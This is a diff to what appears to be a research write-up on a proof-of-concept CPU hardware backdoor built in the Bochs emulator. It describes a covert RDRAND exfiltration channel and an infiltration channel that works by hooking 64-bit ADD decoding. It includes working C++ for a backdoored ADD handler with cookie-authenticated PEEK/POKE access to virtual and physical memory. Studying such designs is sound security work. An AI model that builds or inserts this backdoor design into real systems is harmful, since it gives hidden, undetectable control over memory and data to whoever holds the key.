@@ -9,7 +9,7 @@ In order to have a functioning backdoor we need several things -- we need a
 context in which to execute backdoor code, and ways to communicate with the
 backdoor code. The first one is easy to solve -- if we are able to create new
 hardware on the CPU die, we can add an additional processor on it (let's call
-it (or its emulation in Bochs) the ubervisor) with a bit of memory and have it
+it or its emulation in Bochs the ubervisor) with a bit of memory and have it
 be totally independent from any of the code that the x86 CPU executes.
 
 The second part is harder. We need to find out how we can pass data from
@@ -18,7 +18,7 @@ running on the CPU (whether in user mode, kernel mode, or even SMM mode) should
 be able to differentiate between if the CPU is backdoored and a case where it
 is not. 
 
-RDRAND COVERT CHANNEL
+DATA EXFILTRATION USING RDRAND COVERT CHANNEL
 
 We first focus on communication from the ubervisor to user mode x86 code.
 
@@ -66,8 +66,9 @@ This is of course is AES run in counter mode -- but with a silly and important
 twist. If we just generated a keystream by encrypting a counter and XOR'd the
 keystream with the data we want to exfiltrate (and used that as RDRAND output),
 given just two sequential RDRAND values, we couldn't know the offset within the
-keystream that was used. Instead, we encode the data we want to exfiltrate *as*
-what would otherwise be the nonce in the block we encrypt to generate the
+keystream that was used (remember, other code that isn't ours may call RDRAND
+any number of times). Instead, we use the data we want to exfiltrate as the
+nonce in the block (which contains the counter) we encrypt to generate the
 keystream. That way, we don't have any synchronization issues but we retain all
 the security properties of CTR mode.
 
@@ -80,4 +81,117 @@ consecutive RDRAND executions (if the OS preempts us between the two RDRAND
 instructions and runs RDRAND (or switches to another task that runs RDRAND),
 we need to try executing the two RDRANDs again. However, in testing this has
 not happened).
+
+DATA INFILTRATION TO THE UBERVISOR
+
+We now need to find a way for user mode x86 code to communicate data *to* the
+ubervisor (and make it impossible to prove that some given x86 code is doing
+so). We have two needs -- we need to encrypt all the data we send to the
+ubervisor and we also need a way to signal to the ubervisor that we would like
+to send it data.
+
+I decided to hook the ADD_EqGqM function, which is called when an ADD operation
+on two 64 bit general registers is decoded.
+
+In order to signal to the ubervisor that there is valid encrypted data in the
+registers, we put an (encrypted) magic cookie in RAX and RBX and test for it
+each time the hooked instruction is decoded. If the magic cookie is found in
+RAX/RBX, we extract the (encrypted) data from RCX/RDX.
+
+We encrypt the data with AES in counter mode -- with a different counter than
+is used for the RDRAND exfiltration. Again, we have a synchronization issue --
+how can we make sure we always know where the ubervisor's counter is? We
+resolve this by having the counter increment only when we see a valid magic
+cookie (and of course, for each 128-bit chunk of keystream we generate
+afterwards). That way, the ubervisor's counter is always known to us,
+regardless of how many times the hooked instruction is executed. 
+
+Note that CTR mode is malleable, if this were a production system I would
+include a MAC (and store the MAC result in an additional register pair).
+
+Here is the backdoored ADD_GqEqR function:
+
+ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
+{
+  Bit64u op1_64, op2_64, sum_64;
+  uint8_t error = 1;
+  uint8_t data = 0xcc;
+  uint8_t keystream [16];
+ 
+   op1_64 = BX_READ_64BIT_REG(i->dst());
+   op2_64 = BX_READ_64BIT_REG(i->src());
+   sum_64 = op1_64 + op2_64;
+
+  /* Übercall calling convention:
+     authentication:
+     RAX = 0x99a0086fba28dfd1
+     RBX = 0xe2dd84b5c9688a03
+
+     arguments:
+     RCX = ubercall number
+     RDX = argument 1 (usually an address)
+     RSI = argument 2 (usually a value)
+
+     testing only:
+     RDI = return value
+     RBP = error indicator (1 iff an error occured)
+     ^^^^^ testing only ^^^^^
+
+     ubercall numbers:
+     RCX = 0xabadbabe00000001 is PEEK to a virtual address 
+        return *(uint8_t *) RDX
+     RCX = 0xabadbabe00000002 is POKE to a virtual address
+        *(uint8_t *) RDX = RSI
+     if the page table walk fails, we don't generate any kind of fault or
+     exception, we just write 1 to the error indicator field.
+
+     the page table that is used is the one that is used when the current
+     process accesses memory
+
+     RCX = 0xabadbabe00000003 is PEEK to a physical address 
+        return *(uint8_t *) RDX
+     RCX = 0xabadbabe00000004 is POKE to a physical address
+        *(uint8_t *) RDX = RSI
+
+     (we only read/write 1 byte at a time because anything else could
+     involve alignment issues and/or access that cross page boundaries)
+     */
+
+  ctr_output(keystream);
+  if (((RAX ^ *((uint64_t *) keystream)) == 0x99a0086fba28dfd1) && ((RBX ^ *((uint64_t *) keystream + 1)) == 0xe2dd84b5c9688a03)) {
+      // we have a valid ubercall, let's do this texas-style
+      printf("COUNTER = %016lX\n", BX_CPU_THIS_PTR evil.i_counter);
+      printf("entered ubercall! RAX = %016lX RBX = %016lX RCX = %016lX RDX = %016lX\n", RAX, RBX, RCX, RDX);
+      BX_CPU_THIS_PTR evil.i_counter++;
+      ctr_output(keystream);
+      BX_CPU_THIS_PTR evil.i_counter++;
+
+      switch (RCX ^ *((uint64_t *) keystream)) {
+          case 0xabadbabe00000001: // peek, virtual
+              access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 1), 1, 0, BX_READ, (void *) &data, &error);
+              BX_CPU_THIS_PTR evil.evilbyte = data;
+              BX_CPU_THIS_PTR evil.evilstatus = error;
+              break;
+      }
+      BX_CPU_THIS_PTR evil.out_stat = 0; /* we start at the hi half of the
+                                            output block now */
+  }
+
+  BX_WRITE_64BIT_REG(i->dst(), sum_64);
+
+  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);
+
+  BX_NEXT_INSTR(i);
+}
+
+void BX_CPU_C::ctr_output(uint8_t *out) {
+    uint8_t ibuf [16];
+
+    AES_KEY keyctx;
+    AES_set_encrypt_key(BX_CPU_THIS_PTR evil.aes_key, 128, &keyctx);
+
+    memset(ibuf, 0xef, 16);
+    memcpy(ibuf, &(BX_CPU_THIS_PTR evil.i_counter), 8);
+    AES_encrypt(ibuf, out, &keyctx);
+}
 
